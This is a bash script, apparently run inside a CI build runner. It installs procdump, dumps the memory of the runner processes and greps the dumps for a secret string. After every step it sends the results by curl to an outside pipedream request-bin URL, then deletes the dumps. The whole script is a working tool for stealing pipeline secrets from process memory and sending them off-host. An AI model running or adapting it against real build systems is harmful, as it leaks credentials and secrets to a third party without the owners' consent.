#!/bin/bash

# 1) ----------- install procdump
sudo apt-get install procdump -y > /tmp/file.txt

echo "finished 1)" >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net

# 2) ----------- test that procdump works

procdump > /tmp/file.txt

echo "finished 2)" >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net

mkdir dumps

# 3) ----------- loop pids related to runner and create procdump
for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
do
    echo "about to dump for $pid" > /tmp/file.txt
    curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net

    sudo procdump -o dumps -p $pid > /tmp/file.txt
    curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net

    echo "finished dump for $pid" > /tmp/file.txt
    echo $(ls -la dumps) >> /tmp/file.txt
    curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net

    echo "looking for string in dump" > /tmp/file.txt
    strings dumps/* | grep EKO >> /tmp/file.txt
    curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net

    echo "removing dump" > /tmp/file.txt
    rm -rf dumps/* >> /tmp/file.txt
    curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net

done

echo "finished.. cleaning up" > /tmp/file.txt
rm -rf dumps/ >> /tmp/file.txt
curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net
